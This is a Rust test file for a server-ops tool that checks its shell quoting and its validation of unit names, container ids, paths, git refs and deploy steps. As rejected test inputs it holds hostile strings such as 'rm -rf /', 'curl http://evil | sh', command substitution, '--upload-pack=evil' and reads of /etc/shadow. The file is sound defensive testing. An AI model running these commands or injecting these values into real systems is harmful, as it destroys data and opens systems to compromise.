//! Validator and command-template tests (moved verbatim from `safe.rs`).
//!
//! These are the tests that make the security boundary real: a hostile unit
//! name, container id, path or deploy step must be *rejected*, never quoted
//! into a command.

use super::capability::require_nginx_path;
use super::*;
use crate::remote;

// -- shell_quote ---------------------------------------------------------

#[test]
fn quotes_plain_values() {
    assert_eq!(shell_quote("nginx.service"), "'nginx.service'");
}

#[test]
fn escapes_embedded_single_quotes() {
    assert_eq!(shell_quote("it's"), "'it'\\''s'");
}

#[test]
fn neutralises_a_shell_breakout() {
    // Unquoted, this value would be a command separator. Quoted, the
    // semicolon is just a character inside one literal argument.
    let quoted = shell_quote("x; rm -rf /");
    assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
    assert_eq!(quoted.matches('\'').count(), 2, "除首尾外不应再有引号");
    assert!(
        quoted.contains("; rm -rf /"),
        "分隔符被包在引号内，不会被执行"
    );
}

// -- validate_unit -------------------------------------------------------

#[test]
fn accepts_normal_unit_names() {
    assert!(validate_unit("nginx.service").is_ok());
    assert!(validate_unit("docker.service").is_ok());
    assert!(validate_unit("systemd-timesyncd.service").is_ok());
    assert!(validate_unit("apt-daily.timer").is_ok());
    assert!(validate_unit("foo@bar.service").is_ok());
}

#[test]
fn rejects_unit_names_without_a_known_suffix() {
    assert!(validate_unit("nginx").is_err());
    assert!(validate_unit("nginx.conf").is_err());
}

#[test]
fn rejects_injection_in_unit_names() {
    assert!(validate_unit("nginx.service; rm -rf /").is_err());
    assert!(validate_unit("nginx.service && id").is_err());
    assert!(validate_unit("nginx.service$(id)").is_err());
    assert!(validate_unit("nginx.service`id`").is_err());
    assert!(validate_unit("nginx.service|id").is_err());
    assert!(validate_unit("").is_err());
}

// -- paths ---------------------------------------------------------------

#[test]
fn accepts_clean_absolute_paths() {
    assert!(validate_abs_path("/etc/nginx/nginx.conf", "路径").is_ok());
    assert!(validate_abs_path("/var/www/my-app", "路径").is_ok());
}

#[test]
fn rejects_relative_and_traversing_paths() {
    assert!(validate_abs_path("etc/nginx", "路径").is_err());
    assert!(validate_abs_path("/etc/nginx/../shadow", "路径").is_err());
    assert!(validate_abs_path("/etc/./nginx", "路径").is_err());
}

#[test]
fn is_within_requires_a_real_segment_boundary() {
    assert!(is_within("/etc/nginx/conf.d", "/etc/nginx"));
    assert!(is_within("/etc/nginx", "/etc/nginx"));
    // Same prefix, different directory — must not pass.
    assert!(!is_within("/etc/nginx-secret", "/etc/nginx"));
    assert!(!is_within("/etc/other", "/etc/nginx"));
}

#[test]
fn nginx_paths_must_stay_inside_the_config_directory() {
    assert!(require_nginx_path("/etc/nginx/sites-available/default").is_ok());
    assert!(require_nginx_path("/etc/shadow").is_err());
    assert!(require_nginx_path("/tmp/evil.conf").is_err());
}

// -- containers / images -------------------------------------------------

#[test]
fn accepts_container_ids_and_names() {
    assert!(validate_container("a1b2c3d4e5f6").is_ok());
    assert!(validate_container("my-app_1").is_ok());
}

#[test]
fn rejects_container_injection() {
    assert!(validate_container("-v /:/host").is_err());
    assert!(validate_container("x && id").is_err());
    assert!(validate_container("").is_err());
}

#[test]
fn accepts_normal_image_references() {
    assert!(validate_image("nginx:latest").is_ok());
    assert!(validate_image("ghcr.io/acme/app:1.2.3").is_ok());
    assert!(validate_image("nginx@sha256:abcdef").is_ok());
}

#[test]
fn rejects_malformed_image_references() {
    assert!(validate_image("nginx:1:2").is_err());
    assert!(validate_image("--help").is_err());
}

// -- lines ---------------------------------------------------------------

#[test]
fn validates_line_counts() {
    assert!(validate_lines(1).is_ok());
    assert!(validate_lines(500).is_ok());
    assert!(validate_lines(10_000).is_ok());
    assert!(validate_lines(0).is_err());
    assert!(validate_lines(10_001).is_err());
}

// -- git -----------------------------------------------------------------

#[test]
fn validates_git_refs() {
    assert!(validate_git_ref("main").is_ok());
    assert!(validate_git_ref("release/1.0").is_ok());
    assert!(validate_git_ref("v1.2.3").is_ok());
    assert!(validate_git_ref("--upload-pack=evil").is_err());
    assert!(validate_git_ref("a..b").is_err());
}

#[test]
fn validates_repo_urls() {
    assert!(validate_repo_url("https://github.com/acme/app.git").is_ok());
    assert!(validate_repo_url("git@github.com:acme/app.git").is_ok());
    assert!(validate_repo_url("ssh://git@host/app.git").is_ok());
    assert!(validate_repo_url("file:///etc/passwd").is_err());
    assert!(validate_repo_url("rm -rf /").is_err());
}

// -- deploy steps --------------------------------------------------------

#[test]
fn accepts_typical_deploy_steps() {
    let root = "/var/www/app";
    assert!(validate_deploy_step("git pull --ff-only", root).is_ok());
    assert!(validate_deploy_step("npm ci", root).is_ok());
    assert!(validate_deploy_step("npm run build", root).is_ok());
    assert!(validate_deploy_step("docker compose up -d", root).is_ok());
    assert!(validate_deploy_step("systemctl restart app", root).is_ok());
    assert!(validate_deploy_step("mkdir -p /var/www/app/tmp", root).is_ok());
}

#[test]
fn rejects_chained_or_substituted_steps() {
    let root = "/var/www/app";
    assert!(validate_deploy_step("git pull; rm -rf /", root).is_err());
    assert!(validate_deploy_step("git pull && rm -rf /", root).is_err());
    assert!(validate_deploy_step("git pull | sh", root).is_err());
    assert!(validate_deploy_step("echo $(id)", root).is_err());
    assert!(validate_deploy_step("echo `id`", root).is_err());
    assert!(validate_deploy_step("echo $HOME", root).is_err());
}

#[test]
fn rejects_programs_outside_the_allowlist() {
    let root = "/var/www/app";
    assert!(validate_deploy_step("curl http://evil | sh", root).is_err());
    assert!(validate_deploy_step("wget http://evil", root).is_err());
    assert!(validate_deploy_step("bash script.sh", root).is_err());
    assert!(validate_deploy_step("chmod 777 /etc", root).is_err());
}

#[test]
fn deploy_steps_cannot_reach_outside_the_project() {
    let root = "/var/www/app";
    assert!(validate_deploy_step("rm -rf /var/log", root).is_err());
    assert!(validate_deploy_step("cp -r /etc .", root).is_err());
    assert!(validate_deploy_step("rm -rf ../other", root).is_err());
    // Relative paths stay where the shell is, which is the project dir.
    assert!(validate_deploy_step("rm -rf dist", root).is_ok());
}

#[test]
fn rejects_empty_or_oversized_steps() {
    let root = "/var/www/app";
    assert!(validate_deploy_step("   ", root).is_err());
    assert!(validate_deploy_step(&"npm run ".repeat(200), root).is_err());
}

// -- capability → command ------------------------------------------------

#[test]
fn service_actions_end_option_parsing() {
    let command = Capability::ServiceAction {
        action: ServiceAction::Restart,
        unit: "nginx.service".to_string(),
    }
    .command()
    .unwrap();
    assert_eq!(command, "systemctl restart -- 'nginx.service'");
}

#[test]
fn a_hostile_unit_never_becomes_a_command() {
    let result = Capability::ServiceAction {
        action: ServiceAction::Start,
        unit: "nginx.service; cat /etc/shadow".to_string(),
    }
    .command();
    assert!(result.is_err(), "恶意单元名必须被拒绝，而不是拼进命令");
}

#[test]
fn service_status_places_options_before_the_unit() {
    let command = Capability::ServiceStatus {
        unit: "nginx.service".to_string(),
    }
    .command()
    .unwrap();
    assert_eq!(command, "systemctl status --no-pager -- 'nginx.service'");
}

#[test]
fn journal_scopes_to_one_unit() {
    let command = Capability::Journal {
        unit: Some("ssh.service".to_string()),
        lines: 200,
        priority: None,
    }
    .command()
    .unwrap();
    assert_eq!(
        command,
        "journalctl -u 'ssh.service' -n 200 --no-pager -o json"
    );
}

#[test]
fn journal_filters_by_priority() {
    let command = Capability::Journal {
        unit: None,
        lines: 500,
        priority: Some(3),
    }
    .command()
    .unwrap();
    assert_eq!(command, "journalctl -n 500 --no-pager -o json -p 3");

    let result = Capability::Journal {
        unit: None,
        lines: 500,
        priority: Some(9),
    }
    .command();
    assert!(result.is_err());
}

#[test]
fn docker_remove_forces_the_container() {
    let command = Capability::ContainerAction {
        action: ContainerAction::Remove,
        container: "web".to_string(),
    }
    .command()
    .unwrap();
    assert_eq!(command, "docker rm -f -- 'web'");
}

#[test]
fn docker_logs_rejects_an_option_shaped_name() {
    let result = Capability::DockerLogs {
        container: "--all".to_string(),
        lines: 100,
    }
    .command();
    assert!(result.is_err());
}

#[test]
fn nginx_write_paths_are_confined() {
    let result = Capability::NginxBackup {
        path: "/etc/shadow".to_string(),
    }
    .command();
    assert!(result.is_err());

    let command = Capability::NginxBackup {
        path: "/etc/nginx/nginx.conf".to_string(),
    }
    .command()
    .unwrap();
    assert_eq!(
        command,
        "cp -- '/etc/nginx/nginx.conf' '/etc/nginx/nginx.conf.blsops.bak'"
    );
}

#[test]
fn enabling_a_site_uses_a_symlink() {
    let command = Capability::NginxSetSiteEnabled {
        site: "app".to_string(),
        enable: true,
    }
    .command()
    .unwrap();
    assert_eq!(
        command,
        "ln -sfn /etc/nginx/sites-available/'app' /etc/nginx/sites-enabled/'app'"
    );
}

#[test]
fn disabling_a_site_removes_only_that_link() {
    let command = Capability::NginxSetSiteEnabled {
        site: "app".to_string(),
        enable: false,
    }
    .command()
    .unwrap();
    assert_eq!(command, "rm -f -- /etc/nginx/sites-enabled/'app'");
}

#[test]
fn a_site_name_cannot_escape_its_directory() {
    let result = Capability::NginxSetSiteEnabled {
        site: "../../../etc".to_string(),
        enable: true,
    }
    .command();
    // `..` is not in the safe character set, so this is rejected outright.
    assert!(result.is_err());
}

#[test]
fn deploy_steps_are_validated_against_their_root() {
    let ok = Capability::DeployStep {
        step: "git pull --ff-only".to_string(),
        root: "/var/www/app".to_string(),
    }
    .command();
    assert!(ok.is_ok());

    let bad = Capability::DeployStep {
        step: "rm -rf /var/log".to_string(),
        root: "/var/www/app".to_string(),
    }
    .command();
    assert!(bad.is_err());
}

#[test]
fn timeouts_grow_for_slow_actions() {
    assert_eq!(Capability::ListServices.timeout(), remote::DEFAULT_TIMEOUT);
    assert!(
        Capability::DeployStep {
            step: "npm run build".to_string(),
            root: "/srv/app".to_string(),
        }
        .timeout()
        .as_secs()
            > 60
    );
}
